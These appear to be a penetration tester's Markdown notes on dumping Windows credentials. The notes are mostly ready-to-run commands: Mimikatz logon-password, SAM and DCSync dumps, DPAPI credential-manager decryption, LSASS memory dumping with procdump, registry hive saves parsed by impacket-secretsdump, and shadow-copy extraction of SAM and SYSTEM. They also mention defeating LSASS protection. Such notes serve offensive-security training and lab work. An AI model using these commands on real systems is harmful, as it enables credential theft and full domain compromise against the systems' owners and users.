## Dump
- ADFS private key
- DPAI Absuse
	- credential manager
- Clear Text LAPS Password from LDAP
- LSASS
- ntds.dit
  
***
### LSASS protection

Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 
```

If this is the case, you can‚Äôt just dump or parse LSASS, and you need to disable the protection with something like `mimidrv.sys`. I won‚Äôt discuss how to do that here.

### Dumping secrets with Mimikatz

```plaintext
# Dump logon passwords
sekurlsa::logonpasswords

# Dump all domain hashes from a DC
## Note: Everything with /patch is noisy as heck since it _writes_ to LSASS üö©
lsadump::lsa /patch

# Dump only local users
lsadump::sam

# DCSync (requires 'ldap' SPN)
lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local
```

Windows Credential Vault dumping

> I‚Äôve had some issues using this with `Invoke-Mimikatz.ps1`. Try with native Mimikatz if having issues.

```
# Dump windows secrets, such as stored creds for scheduled tasks (elevate first)
vault::list
vault::cred /patch

# Dump windows secrets DPAPI method (less noise and no specific rights reqd yay)
## More here: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
## First, get GUID of master key for specific secret
dpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D

## EITHER Grab dpapi keys from LSASS
sekurlsa::dpapi

## OR Grab and cache a specific key
dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b

## Mimikatz will cache the master key (check with dpapi::cache)
## Then run the initial dpapi::cred command again to get the juice!
```

### Dumping secrets without Mimikatz

We can also parse system secrets without using Mimikatz on the target system directly.

#### Dumping LSASS

The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. [Dumpert](https://github.com/outflanknl/Dumpert), [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), or other (custom) tooling can be used to dump LSASS memory.

```powershell
# Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly
.\procdump.exe -r -ma lsass.exe lsass.dmp
```

After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to ‚ÄòMinidump‚Äô mode to parse the file as follows.

```plaintext
sekurlsa::minidump lsass.dmp
```

After this, we can run Mimikatz commands as usual.

#### Dumping secrets from the registry

We can dump secrets from the registry and parse the files ‚Äúoffline‚Äù to get a list of system secrets. üö©

On the target, we run the following:

```powershell
reg.exe save hklm\sam c:\users\public\downloads\sam.save
reg.exe save hklm\system c:\users\public\downloads\system.save
reg.exe save hklm\security c:\users\public\downloads\security.save
```

Then on our attacking box we can dump the secrets with Impacket:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save -history -user-status -pwd-last-set LOCAL > secrets.out
```

> `-user-status` Display whether or not the user is disabled
>  `-history` Dump password history
>   `-pwd-last-set` Shows pwdLastSet attribute for each NTDS.DIT account.

#### Dumping secrets from a Volume Shadow Copy

We can also create a ‚ÄúVolume Shadow Copy‚Äù of the `SAM` and `SYSTEM` files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.

```powershell
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
``` 
***
## Misc
- [RDP Session Hijacking](http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html)